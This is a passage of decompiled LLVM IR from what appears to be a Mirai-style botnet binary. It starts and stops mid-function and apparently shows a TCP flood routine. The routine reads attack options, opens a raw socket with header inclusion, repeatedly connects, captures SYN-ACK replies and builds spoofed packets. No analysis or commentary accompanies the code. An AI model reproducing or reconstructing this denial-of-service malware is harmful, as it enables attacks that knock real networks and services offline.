  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v7_9964 = inttoptr i32 %v0_9958 to i32*
  %v8_9964 = call i32 @attack_get_opt_int(i32 %v0_995c, i32* %v7_9964, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_9940)
  %v0_9968 = load i32, i32* @r5, align 4
  store i32 %v0_9968, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_9964, i32* @r7, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_997c = inttoptr i32 %v0_9968 to i32*
  %v6_997c = call i32 @attack_get_opt_int(i32 %v0_9978, i32* %v5_997c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9984 = urem i32 %v6_997c, 256
  store i32 %v1_9984, i32* %ip.global-to-local, align 4
  %v0_9988 = load i32, i32* @r5, align 4
  store i32 %v0_9988, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_997c, 16777216
  %v5_999c = sdiv i32 %sext, 16777216
  %v6_999c = inttoptr i32 %v0_9988 to i32*
  %v7_999c = call i32 @attack_get_opt_int(i32 %v0_9994, i32* %v6_999c, i32 5, i32 1, i32 %v5_999c)
  %v1_99a8 = urem i32 %v7_999c, 256
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  %v0_99b0 = load i32, i32* @r5, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_99b8 = load i32, i32* @r4, align 4
  store i32 %v0_99b8, i32* %r0.global-to-local, align 4
  %v6_99c0 = inttoptr i32 %v0_99b0 to i32*
  %v7_99c0 = call i32 @attack_get_opt_int(i32 %v0_99b8, i32* %v6_99c0, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_99a8)
  %v0_99c4 = load i32, i32* @r5, align 4
  store i32 %v0_99c4, i32* %r1.global-to-local, align 4
  %v3_99c8 = mul i32 %v7_99c0, 65536
  store i32 %v3_99c8, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v3_99d8 = urem i32 %v7_99c0, 65536
  store i32 %v3_99d8, i32* @sl, align 4
  %v5_99dc = inttoptr i32 %v0_99c4 to i32*
  %v6_99dc = call i32 @attack_get_opt_int(i32 %v0_99d4, i32* %v5_99dc, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @attack_get_opt_int(i32 %v0_99f4, i32* %v5_99fc, i32 12, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @attack_get_opt_int(i32 %v0_9a14, i32* %v5_9a1c, i32 13, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @attack_get_opt_int(i32 %v0_9a34, i32* %v5_9a3c, i32 14, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9a48 = load i32, i32* @r5, align 4
  store i32 %v0_9a48, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a48 to i32*
  %v6_9a5c = call i32 @attack_get_opt_int(i32 %v0_9a54, i32* %v5_9a5c, i32 15, i32 1, i32 %v1_9a44)
  %v1_9a64 = urem i32 %v6_9a5c, 256
  store i32 %v1_9a64, i32* %ip.global-to-local, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  store i32 %v0_9a68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a74 = load i32, i32* @r4, align 4
  store i32 %v0_9a74, i32* %r0.global-to-local, align 4
  %v5_9a7c = inttoptr i32 %v0_9a68 to i32*
  %v6_9a7c = call i32 @attack_get_opt_int(i32 %v0_9a74, i32* %v5_9a7c, i32 16, i32 1, i32 %v1_9a64)
  %v1_9a84 = urem i32 %v6_9a7c, 256
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a90 = load i32, i32* @r5, align 4
  store i32 %v0_9a90, i32* %r1.global-to-local, align 4
  %v0_9a94 = load i32, i32* @r4, align 4
  store i32 %v0_9a94, i32* %r0.global-to-local, align 4
  %v5_9a9c = inttoptr i32 %v0_9a90 to i32*
  %v6_9a9c = call i32 @attack_get_opt_int(i32 %v0_9a94, i32* %v5_9a9c, i32 0, i32 768, i32 %v1_9a84)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r1.global-to-local, align 4
  %v0_9ab0 = load i32, i32* @r4, align 4
  store i32 %v0_9ab0, i32* %r0.global-to-local, align 4
  %v5_9ab4 = inttoptr i32 %v0_9aac to i32*
  %v6_9ab4 = call i32 @attack_get_opt_int(i32 %v0_9ab0, i32* %v5_9ab4, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9abc = urem i32 %v6_9ab4, 256
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9ad0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v7_9ad4 = icmp eq i32 %v3_9ad0, -1
  store i1 %v7_9ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9ad0, i32* @sb, align 4
  br i1 %v7_9ad4, label %dec_label_pc_9cc4, label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9ae8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9ae8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9afc = call i32 @__GI_setsockopt(i32 %v3_9ad0, i32 0, i32 3, i32 %v6_9ae8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9afc, i32* %r0.global-to-local, align 4
  %v7_9b00 = icmp eq i32 %v5_9afc, -1
  store i1 %v7_9b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b00, label %dec_label_pc_9cbc, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9ae0
  %v0_9b08 = load i32, i32* @r7, align 4
  %v3_9b08 = mul i32 %v0_9b08, 65536
  store i32 %v3_9b08, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9b10 = load i32, i32* @r6, align 4
  %v2_9b10 = icmp eq i32 %v0_9b10, 0
  store i1 %v2_9b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9b18 = urem i32 %v0_9b08, 65536
  store i32 %v3_9b18, i32* @fp, align 4
  br i1 %v2_9b10, label %dec_label_pc_9f48, label %dec_label_pc_9b20.preheader

dec_label_pc_9b20.preheader:                      ; preds = %dec_label_pc_9b08
  %v2_9b6c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9bb0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9be8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bf4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bf8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c58 = zext i8 %tmp to i32
  %v1_9c5c = and i32 %v4_9c58, 18
  %v2_9c60 = icmp eq i32 %v1_9c5c, 18
  %v3_9c44 = sext i16 %tmp61 to i32
  %v1_9c68 = and i32 %v4_9c58, 5
  %v2_9c68 = icmp eq i32 %v1_9c68, 0
  %v4_9ba8 = add i32 %v2_9b6c, 82
  %v5_9ba8 = inttoptr i32 %v4_9ba8 to i16*
  %v1_9d98 = add i32 %v6_9a9c, 40
  %v1_9eac = urem i32 %v6_99dc, 2
  %tmp95 = sub nsw i32 0, %v1_9eac
  %v4_9eb4 = and i32 %tmp95, 32
  %v1_9ec4 = urem i32 %v6_99fc, 2
  %tmp96 = sub nsw i32 0, %v1_9ec4
  %v4_9ecc = and i32 %tmp96, 16
  %v1_9edc = urem i32 %v6_9a1c, 2
  %tmp97 = sub nsw i32 0, %v1_9edc
  %v4_9ee4 = and i32 %tmp97, 8
  %v1_9ef4 = urem i32 %v6_9a3c, 2
  %tmp98 = sub nsw i32 0, %v1_9ef4
  %v4_9efc = and i32 %tmp98, 4
  %v1_9f0c = urem i32 %v6_9a5c, 2
  %tmp99 = sub nsw i32 0, %v1_9f0c
  %v3_9f14 = and i32 %tmp99, 2
  %v1_9f24 = urem i32 %v6_9a7c, 2
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.preheader, %dec_label_pc_9c94
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c94 ], [ %tmp34, %dec_label_pc_9b20.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c94 ], [ %tmp37, %dec_label_pc_9b20.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b2c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9b2c, i32* %r0.global-to-local, align 4
  %v7_9b30 = icmp eq i32 %v3_9b2c, -1
  store i1 %v7_9b30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9b2c, i32* @r5, align 4
  br i1 %v7_9b30, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9b3c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9c70
  %v0_9b44 = phi i32 [ %v3_9c84, %dec_label_pc_9c70 ], [ %v3_9b2c, %dec_label_pc_9b20 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c70 ], [ %stack_var_-62.0, %dec_label_pc_9b20 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d44, %dec_label_pc_9c70 ], [ %stack_var_-60.0, %dec_label_pc_9b20 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9b44 = call i32 @__libc_fcntl(i32 %v0_9b44, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b4c = or i32 %v2_9b44, 2048
  store i32 %v1_9b4c, i32* @r2, align 4
  %v0_9b50 = load i32, i32* @r5, align 4
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  %v2_9b54 = call i32 @__libc_fcntl(i32 %v0_9b50, i32 4)
  %v3_9b58 = load i32, i32* %stack_var_-44, align 4
  %v5_9b60 = mul i32 %v3_9b58, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b74 = add i32 %v5_9b60, %arg2
  store i32 %v2_9b74, i32* %r3.global-to-local, align 4
  %v1_9b78 = add i32 %v2_9b74, 20
  %v2_9b78 = inttoptr i32 %v1_9b78 to i8*
  %v3_9b78 = load i8, i8* %v2_9b78, align 1
  %v4_9b78 = zext i8 %v3_9b78 to i32
  store i32 %v4_9b78, i32* %r2.global-to-local, align 4
  %v2_9b7c = icmp ugt i8 %v3_9b78, 30
  %v7_9b7c = icmp eq i8 %v3_9b78, 31
  store i1 %v7_9b7c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b80 = xor i1 %v7_9b7c, true
  %v3_9b80 = and i1 %v2_9b7c, %v2_9b80
  br i1 %v3_9b80, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9b3c
  %v5_9b80 = add i32 %v2_9b74, 16
  %v6_9b80 = inttoptr i32 %v5_9b80 to i32*
  %v7_9b80 = load i32, i32* %v6_9b80, align 4
  store i32 %v7_9b80, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9b3c, %bb
  %v4_9b84 = phi i32 [ %v2_9b74, %dec_label_pc_9b3c ], [ %v7_9b80, %bb ]
  %v4_9b84.stack_var_-60.1 = select i1 %v3_9b80, i32 %v4_9b84, i32 %stack_var_-60.1
  %v2_9b88 = xor i1 %v2_9b7c, true
  %v3_9b88 = or i1 %v7_9b7c, %v2_9b88
  br i1 %v3_9b88, label %dec_label_pc_9cd0, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %bb71, %dec_label_pc_9cd0
  %v0_9d44 = phi i32 [ %v5_9d20, %dec_label_pc_9cd0 ], [ %v4_9b84.stack_var_-60.1, %bb71 ]
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  %v0_9b94 = load i32, i32* @sl, align 4
  %v9_9b94 = icmp eq i32 %v0_9b94, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_9b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b94, label %dec_label_pc_9d2c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b8c
  %v4_9b98 = udiv i32 %v0_9b94, 256
  %v2_9b9c = urem i32 %v0_9b94, 256
  store i32 %v2_9b9c, i32* %r2.global-to-local, align 4
  %v5_9ba0 = mul nuw nsw i32 %v2_9b9c, 256
  %v6_9ba0 = or i32 %v5_9ba0, %v4_9b98
  store i32 %v6_9ba0, i32* %r3.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  %v2_9ba8 = trunc i32 %v6_9ba0 to i16
  store i16 %v2_9ba8, i16* %v5_9ba8, align 2
  br label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %.thread9, %dec_label_pc_9d2c
  %stack_var_-62.2 = phi i16 [ %v1_9d2c, %dec_label_pc_9d2c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9bb0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r5, align 4
  store i32 %v0_9bb8, i32* %r0.global-to-local, align 4
  %v3_9bbc = call i32 @__libc_connect(i32 %v0_9bb8, i32 %v2_9bb0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9bc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_9bc4, i32* %r0.global-to-local, align 4
  store i32 %v2_9bc4, i32* @r4, align 4
  %v9_9c24 = icmp eq i32 %tmp35, %v0_9d44
  %v4_9c4c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9c24 to i32
  %v9_9c38 = icmp eq i1 %v9_9c24, false
  %v9_9c50 = icmp eq i32 %v3_9c44, %v4_9c4c
  br label %dec_label_pc_9be0

dec_label_pc_9bd0:                                ; preds = %.thread, %dec_label_pc_9c40, %dec_label_pc_9c68, %bb74
  %v2_9bd0 = call i32 @__GI_time(i32* null)
  %v0_9bd4 = load i32, i32* @r4, align 4
  %v2_9bd4 = sub i32 %v2_9bd0, %v0_9bd4
  store i32 %v2_9bd4, i32* %r0.global-to-local, align 4
  %v7_9bd8 = icmp eq i32 %v2_9bd4, 10
  store i1 %v7_9bd8, i1* %cpsr_z.global-to-local, align 1
  %v8_9bdc = icmp sgt i32 %v2_9bd4, 10
  br i1 %v8_9bdc, label %dec_label_pc_9c70, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9bd0, %dec_label_pc_9bb0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bf4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bf8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9c00 = load i32, i32* @sb, align 4
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  %v6_9c08 = call i32 @__libc_recvfrom(i32 %v0_9c00, i32 %v2_9bf4, i32 256, i32 16384, i32 %v2_9be8, i32 %v2_9bf8)
  store i32 %v6_9c08, i32* %r2.global-to-local, align 4
  %v7_9c10 = icmp eq i32 %v6_9c08, -1
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9c10, label %dec_label_pc_9cc4, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9be0
  store i32 %v0_9d44, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9c30 = icmp eq i32 %v6_9c08, 40
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  %tmp100 = icmp ult i32 %v6_9c08, 41
  br i1 %tmp100, label %.thread, label %bb74

.thread:                                          ; preds = %dec_label_pc_9c1c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9bd0

bb74:                                             ; preds = %dec_label_pc_9c1c
  store i1 %v9_9c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c38, label %dec_label_pc_9bd0, label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %bb74
  store i32 %v3_9c44, i32* @lr, align 4
  store i32 %v2_9b6c, i32* @r3, align 4
  store i32 %v4_9c4c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c50, label %dec_label_pc_9c58, label %dec_label_pc_9bd0

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9c40
  store i32 %v4_9c58, i32* %r2.global-to-local, align 4
  store i32 %v1_9c5c, i32* @r3, align 4
  store i1 %v2_9c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c60, label %dec_label_pc_9d3c, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c58
  store i1 %v2_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c68, label %dec_label_pc_9bd0, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9bd0
  %v0_9c70 = load i32, i32* @r5, align 4
  store i32 %v0_9c70, i32* %r0.global-to-local, align 4
  %v1_9c74 = call i32 @__GI___libc_close(i32 %v0_9c70)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c84 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9c84, i32* %r0.global-to-local, align 4
  %v3_9c88 = icmp eq i32 %v3_9c84, -1
  %v8_9c88 = icmp eq i32 %v3_9c84, -1
  store i1 %v8_9c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c84, i32* @r5, align 4
  br i1 %v3_9c88, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9b20, %bb81
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9b20 ], [ %stack_var_-62.2, %bb81 ], [ %stack_var_-62.2, %dec_label_pc_9c70 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9b20 ], [ %v0_9d44, %bb81 ], [ %v0_9d44, %dec_label_pc_9c70 ]
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  %v1_9c98 = add i32 %v3_9c94, 1
  store i32 %v1_9c98, i32* @r3, align 4
  %v1_9c9c = load i32, i32* @r6, align 4
  %v9_9c9c = icmp eq i32 %v1_9c98, %v1_9c9c
  store i1 %v9_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c98, i32* %stack_var_-44, align 4
  %v5_9ca4 = icmp slt i32 %v1_9c98, %v1_9c9c
  br i1 %v5_9ca4, label %dec_label_pc_9b20, label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c94
  store i32 %v6_9a9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f58

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9ae0
  %v0_9cbc = load i32, i32* @sb, align 4
  store i32 %v0_9cbc, i32* %r0.global-to-local, align 4
  %v1_9cc0 = call i32 @__GI___libc_close(i32 %v0_9cbc)
  store i32 %v1_9cc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9be0, %entry, %dec_label_pc_9cbc
  %v1_9ccc = phi i32 [ %v3_9ad0, %entry ], [ %v1_9cc0, %dec_label_pc_9cbc ], [ 0, %dec_label_pc_9be0 ]
  store i32 %v27_98fc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9ccc

dec_label_pc_9cd0:                                ; preds = %bb71
  %v1_9cd0 = add i32 %v4_9b84, 16
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* @r4, align 4
  %v0_9cd4 = call i32 @rand_next()
  store i32 %v0_9cd4, i32* %r0.global-to-local, align 4
  %v3_9cd8 = load i32, i32* %stack_var_-44, align 4
  %v5_9ce0 = mul i32 %v3_9cd8, 24
  %v0_9ce8 = load i32, i32* @r4, align 4
  %v1_9ce8 = and i32 %v0_9ce8, 16711680
  store i32 %v1_9ce8, i32* %ip.global-to-local, align 4
  %v3_9cec = udiv i32 %v0_9ce8, 16777216
  %v2_9cf0 = add i32 %v5_9ce0, %arg2
  store i32 %v2_9cf0, i32* %r1.global-to-local, align 4
  %v4_9cf4 = udiv i32 %v1_9ce8, 256
  %v5_9cf4 = or i32 %v4_9cf4, %v3_9cec
  store i32 %v5_9cf4, i32* %r2.global-to-local, align 4
  %v1_9cf8 = and i32 %v0_9ce8, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_9cf8, i32* %r3.global-to-local, align 4
  %v1_9cfc = add i32 %v2_9cf0, 20
  %v2_9cfc = inttoptr i32 %v1_9cfc to i8*
  %v3_9cfc = load i8, i8* %v2_9cfc, align 1
  %v4_9cfc = zext i8 %v3_9cfc to i32
  store i32 %v4_9cfc, i32* %ip.global-to-local, align 4
  %v4_9d00 = mul i32 %v1_9cf8, 256
  %v4_9d04 = mul i32 %v0_9ce8, 16777216
  %v5_9d00 = or i32 %v4_9d00, %v4_9d04
  %v5_9d04 = or i32 %v5_9d00, %v5_9cf4
  %v7_9d08 = lshr i32 %v0_9cd4, %v4_9cfc
  %v8_9d08 = add i32 %v7_9d08, %v5_9d04
  store i32 %v8_9d08, i32* %r2.global-to-local, align 4
  %v1_9d0c = and i32 %v8_9d08, 16711680
  store i32 %v1_9d0c, i32* %r0.global-to-local, align 4
  %v1_9d18 = and i32 %v8_9d08, 65280
  store i32 %v1_9d18, i32* %r1.global-to-local, align 4
  %v5_9d20 = call i32 @llvm.bswap.i32(i32 %v8_9d08)
  store i32 %v5_9d20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b8c

dec_label_pc_9d2c:                                ; preds = %dec_label_pc_9b8c
  %v0_9d2c = call i32 @rand_next()
  %v1_9d2c = trunc i32 %v0_9d2c to i16
  store i32 %v0_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v2_9b6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9bb0

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9c58
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d3c, i32* @r4, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v5_9d44 = mul i32 %v3_9d3c, 16
  %v6_9d44 = add i32 %v5_9d44, %v2_9918
  %v7_9d44 = inttoptr i32 %v6_9d44 to i32*
  store i32 %v0_9d44, i32* %v7_9d44, align 4
  %v0_9d48 = load i32, i32* @r8, align 4
  %v1_9d48 = add i32 %v0_9d48, 4
  %v2_9d48 = inttoptr i32 %v1_9d48 to i32*
  %v3_9d48 = load i32, i32* %v2_9d48, align 4
  store i32 %v3_9d48, i32* %r1.global-to-local, align 4
  %v3_9d50 = udiv i32 %v3_9d48, 16777216
  %v1_9d54 = and i32 %v3_9d48, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_9d54, i32* %r2.global-to-local, align 4
  %v1_9d4c = udiv i32 %v3_9d48, 256
  %v4_9d58 = and i32 %v1_9d4c, 65280
  store i32 %v2_9918, i32* %r0.global-to-local, align 4
  %v4_9d60 = mul i32 %v1_9d54, 256
  %v0_9d64 = load i32, i32* @r4, align 4
  %v3_9d64 = mul i32 %v0_9d64, 16
  %v2_9d68 = add i32 %v3_9d64, %v2_9918
  store i32 %v2_9d68, i32* %ip.global-to-local, align 4
  %v4_9d6c = mul i32 %v3_9d48, 16777216
  %v5_9d58 = or i32 %v4_9d6c, %v3_9d50
  %v5_9d60 = or i32 %v5_9d58, %v4_9d58
  %v5_9d6c = or i32 %v5_9d60, %v4_9d60
  store i32 %v5_9d6c, i32* %r3.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d68, 4
  %v3_9d70 = inttoptr i32 %v2_9d70 to i32*
  store i32 %v5_9d6c, i32* %v3_9d70, align 4
  %v0_9d74 = load i32, i32* @r8, align 4
  %v1_9d74 = add i32 %v0_9d74, 8
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = and i32 %v3_9d74, 16711680
  store i32 %v1_9d78, i32* %r0.global-to-local, align 4
  %v3_9d7c = udiv i32 %v3_9d74, 16777216
  %v1_9d80 = and i32 %v3_9d74, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v4_9d84 = udiv i32 %v1_9d78, 256
  %v4_9d88 = mul i32 %v1_9d80, 256
  store i32 %v6_9a9c, i32* %r2.global-to-local, align 4
  %v4_9d90 = mul i32 %v3_9d74, 16777216
  %v5_9d84 = or i32 %v4_9d90, %v3_9d7c
  %v5_9d88 = or i32 %v5_9d84, %v4_9d84
  %v5_9d90 = or i32 %v5_9d88, %v4_9d88
  store i32 %v5_9d90, i32* %r3.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d74, 2
  %v2_9d94 = inttoptr i32 %v1_9d94 to i16*
  %v3_9d94 = load i16, i16* %v2_9d94, align 2
  %v4_9d94 = zext i16 %v3_9d94 to i32
  store i32 %v4_9d94, i32* %r1.global-to-local, align 4
  store i32 %v1_9d98, i32* @r7, align 4
  %v0_9d9c = load i32, i32* @lr, align 4
  %v1_9d9c = trunc i32 %v0_9d9c to i16
  %v2_9d9c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d9c = add i32 %v2_9d9c, 14
  %v4_9d9c = inttoptr i32 %v3_9d9c to i16*
  store i16 %v1_9d9c, i16* %v4_9d9c, align 2
  %v0_9da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9da0 = trunc i32 %v0_9da0 to i16
  %v2_9da0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9da0 = add i32 %v2_9da0, 12
  %v4_9da0 = inttoptr i32 %v3_9da0 to i16*
  store i16 %v1_9da0, i16* %v4_9da0, align 2
